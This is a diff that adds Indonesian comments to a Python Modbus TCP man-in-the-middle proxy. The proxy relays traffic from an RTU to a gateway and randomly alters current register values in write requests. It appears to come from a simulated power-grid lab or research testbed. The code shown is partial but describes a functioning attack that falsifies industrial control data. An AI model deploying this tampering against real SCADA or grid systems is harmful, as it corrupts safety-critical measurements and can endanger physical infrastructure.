@@ -1,5 +1,7 @@
 from __future__ import annotations
 
+# Proxy Modbus TCP untuk MITM: frame dari RTU diteruskan ke gateway, tetapi nilai
+# register arus (I) dapat dimanipulasi sebelum sampai ke gateway.
 import os
 import random
 import select
@@ -8,6 +10,7 @@ import threading
 import time
 from typing import Optional
 
+# Peta register harus sama dengan RTU/gateway; proxy hanya mengubah register I.
 GATEWAY_IP = "10.0.2.2"
 MODBUS_PORT = 5020
 MITM_PROXY_PORT = 50201
@@ -44,9 +47,11 @@ def _should_modify_now() -> bool:
         return random.random() < MODIFY_PROBABILITY
 
 def _log_mitm_proxy_i(bus: int, i_orig: float, i_new: float, v_before: Optional[float], v_after: Optional[float]):
+    """Hook logging manipulasi I; saat ini sengaja no-op agar output proxy tetap ringan."""
     del bus, i_orig, i_new, v_before, v_after
 
 def _pop_modbus_tcp_frame(buf: bytearray) -> Optional[bytes]:
+    """Ambil satu frame Modbus TCP lengkap dari buffer stream TCP."""
     if len(buf) < 6:
         return None
     length = int.from_bytes(buf[4:6], "big")
@@ -68,6 +73,7 @@ def _mangle_i_register_value(i_orig_amp: float) -> int:
     return min(reg_max, max(0, val))
 
 def _mangle_client_to_server(frame: bytes) -> bytes:
+    """Ubah payload write register Modbus dari client sebelum diteruskan ke gateway."""
     if len(frame) < 8:
         return frame
     length = int.from_bytes(frame[4:6], "big")
@@ -77,6 +83,7 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
     pdu = bytearray(frame[7:])
     fc = pdu[0]
 
+    # FC06 menulis satu register; digunakan RTU saat mengirim nilai per bus.
     if fc == 0x06 and len(pdu) >= 5:
         addr = (pdu[1] << 8) | pdu[2]
         if 0 <= addr < NUM_BUS:
@@ -98,6 +105,7 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
             else:
                 i_after = i_orig
             _log_mitm_proxy_i(bus, i_orig, i_after, v_before, v_before)
+    # FC16 menulis banyak register; setiap register I di rentang target diproses.
     elif fc == 0x10 and len(pdu) >= 6:
         start = (pdu[1] << 8) | pdu[2]
         count = (pdu[3] << 8) | pdu[4]
@@ -133,6 +141,7 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
     return mbap + bytes(pdu)
 
 def _relay_pair(client: socket.socket, upstream: socket.socket):
+    """Relay dua arah; hanya arah client->server yang dimodifikasi."""
     cbuf = bytearray()
     try:
         while True:
@@ -166,6 +175,7 @@ def _relay_pair(client: socket.socket, upstream: socket.socket):
                 pass
 
 def _mitm_client_handler(client: socket.socket, _addr):
+    """Buat koneksi upstream ke gateway untuk satu koneksi client RTU."""
     try:
         upstream = socket.create_connection((GATEWAY_IP, MODBUS_PORT), timeout=15)
         upstream.settimeout(None)
@@ -179,6 +189,7 @@ def _mitm_client_handler(client: socket.socket, _addr):
             pass
 
 def main():
+    """Start listener proxy dan tangani tiap koneksi RTU dalam thread terpisah."""
     random.seed(MITM_FIXED_SEED)
     ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
